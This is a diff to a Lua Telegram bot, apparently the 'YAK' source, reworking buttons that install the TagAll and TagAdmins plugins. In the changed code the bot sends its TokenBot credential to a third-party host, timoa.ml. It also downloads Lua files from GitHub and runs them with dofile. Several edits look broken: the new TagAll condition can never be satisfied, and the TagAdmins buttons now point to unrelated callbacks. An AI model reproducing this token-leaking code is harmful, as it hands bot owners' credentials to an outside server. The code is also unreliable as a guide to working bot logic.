@@ -2451,7 +2451,7 @@ keyboard.inline_keyboard = {{{text="تعطيل الايدي بالصوره",call
 return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(order or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end end
 --     Source YAK     --
-if DataText  == "/TagAll:" then
+if DataText == "/TagAll:" and DataText:match('/TagAll:'..tonumber(data.sender_user_id_)) then
 local CheckFileisFound = io.open("TagAll.lua","r")
 if CheckFileisFound then
 io.close(CheckFileisFound)
@@ -2459,7 +2459,7 @@ CheckFile1 = "(✔)"
 else
 CheckFile1 = "(✖️)"
 end
-https.request("https://timoa.ml/API/test.php?TokenBot="..TokenBot.."&ChatId="..Chat_Id2.."&MsgId="..Msg_Id2.."&check1="..CheckFile1.."&user="..data.sender_user_id_)
+https.request("https://timoa.ml/API/test.php?TokenBot="..TokenBot.."&ChatId="..Chat_Id2.."&MsgId="..Msg_Id2.."&check1="..CheckFile1)
 local GetJson, Res = https.request("https://raw.githubusercontent.com/YAK-TEADD/Files_YAK/main/Files_YAK/TagAll.lua")
 if CheckFile1 == "(✔)" then
 if Res == 200 then
@@ -2474,29 +2474,7 @@ ChekAuto:close()
 dofile('YAK.lua')
 end
 end
-if DataText  and DataText:match('/TagAdmins:'..tonumber(data.sender_user_id_)) then
-local CheckFileisFound = io.open("TagAdmins.lua","r")
-if CheckFileisFound then
-io.close(CheckFileisFound)
-CheckFile1 = "(✔)"
-else
-CheckFile1 = "(✖️)"
-end
-https.request("https://timoa.ml/API/test.php?TokenBot="..TokenBot.."&ChatId="..Chat_Id2.."&MsgId="..Msg_Id2.."&check2="..CheckFile1.."&user="..data.sender_user_id_)
-local GetJson, Res = https.request("https://raw.githubusercontent.com/YAK-TEADD/Files_YAK/main/Files_YAK/TagAdmins.lua")
-if CheckFile1 == "(✔)" then
-if Res == 200 then
-os.execute("rm -fr TagAdmins.lua")
-os.execute('rm -rf TagAdmins.lua') 
-dofile('YAK.lua')  
-end
-else
-local ChekAuto = io.open("TagTagAdminsAll.lua",'w+')
-ChekAuto:write(GetJson)
-ChekAuto:close()
-dofile('YAK.lua')
-end
-end
+
 if DataText and DataText:match('/LockIdPhoto:'..tonumber(data.sender_user_id_)..'(.*)') then
 local ALS = DataText:match('/LockIdPhoto:'..tonumber(data.sender_user_id_)..'(.*)')
 DevALS:set(YAK..'ALS:Lock:Id:Photo'..data.chat_id_,true)
@@ -13051,7 +13029,7 @@ end
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text="TagAll.lua ↬ ",callback_data="/TagAll:"},{text=CheckFile1,callback_data="/TagAll:"}},
-{{text="TagAdmins.lua ↬ ",callback_data="/TagAdmins:"..msg.sender_user_id_},{text=CheckFile2,callback_data="/TagAdmins:"..msg.sender_user_id_}},
+{{text="TagAdmins.lua ↬ ",callback_data="/HelpList4:"..msg.sender_user_id_},{text=CheckFile2,callback_data="/HelpList3:"..msg.sender_user_id_}},
 {{text="AddedMe.lua ↬ ",callback_data="/HelpList6:"..msg.sender_user_id_},{text=CheckFile3,callback_data="/HelpList5:"..msg.sender_user_id_}},
 {{text="ReplyBot.lua ↬ ",callback_data="/DelList:"..msg.sender_user_id_},{text=CheckFile8,callback_data="/HelpList5:"..msg.sender_user_id_}},
 {{text="⁃ اخفاء اࢦـڪليشه .",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
